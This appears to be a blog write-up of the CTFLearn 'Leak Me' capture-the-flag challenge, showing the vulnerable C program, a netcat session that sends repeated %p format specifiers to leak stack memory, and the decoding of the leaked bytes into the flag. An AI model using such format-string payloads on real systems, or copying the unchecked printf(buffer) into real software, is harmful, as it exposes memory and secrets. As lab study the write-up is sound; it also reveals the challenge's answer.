---
title: "CTFLearn Leak Me"
date: 2023-08-22T16:00:42-07:00
categories: ["CTF", "blog"]
---

A problem to exploit the stack with format string attack.

- [Problem link](https://ctflearn.com/challenge/1221)

When I access the program, it
- prompts a question
- and it takes user input
- then prints the input

```
$ nc rivit.dev 10003
What is your favorite format tag? some_text
some_text
```

The problem comes with the program source code and its binary.

```
#include <stdlib.h>
#include <stdio.h>

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char flag[64], buffer[64];

    FILE *f = fopen("./flag.txt", "rt");
    if (f == NULL) {
        puts("No flag.txt found, contact an admin");
        return 1;
    }

    fgets(flag, 64, f);
    fclose(f);

    printf("What is your favorite format tag? ");
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);

    return 0;
}
```

Since it takes user input and print, it might be a problem for buffer overflow.
Let's examine their addresses with Cutter.

I found the flag is read and stored at `0x55f825d31480` and the variable from
user input is stored at `0x7ffe188c5990`. In addition, the input size is
regulated, I cannot use buffer overflow to print it.

Let's go back to the source code. There is something unfamiliar to me in C,
`printf(buffer);`. What we usually do is `printf("%s\n", buffer);` or something
similar. Is there any exploit?

After a research, I found [Format string
attack](https://owasp.org/www-community/attacks/Format_string_attack). Let's try
with `%p`, so hopefully we can get something useful from the stack.

```
$ nc rivit.dev 10003
What is your favorite format tag? %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x7f6f45047b23 0xfbad208b 0x7f6f44f42992 (nil) (nil) (nil) 0x55b5639842a0 0x6e7261656c465443 0x5f336b316c5f317b 0x745f74346d723066 0x7d3030745f356734 0xa 0x1 0x55b5638c3040 0x7f6f4507785c 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070
```

The interesting part is `0x6e7261656c465443 0x5f336b316c5f317b
0x745f74346d723066 0x7d3030745f356734`. I obtained
`nraelFTC_3k1l_1{t_t4mr0f}00t_5g4` via converting into ASCII. It has both
brackets and anagram of CTF. Let's sort the string by block.
`}00t_5g4t_t4mr0f_3k1l_1{nraelFTC` and its reversed string
`CTFlearn{1_l1k3_f0rm4t_t4g5_t00}`.

## Takeaways

I spent 4 hours of reverse engineering to make stack overflow happen with both
disassembly and decompiler output. However, after visiting to the original C
source code, I found something wrong in a few seconds. Soon I could find the
well-known vulnerability on OWASP.

- I should be more carefully walk through the original C source code.
- When seeing a user input directly as output, check for potential format string
  attack if possible.
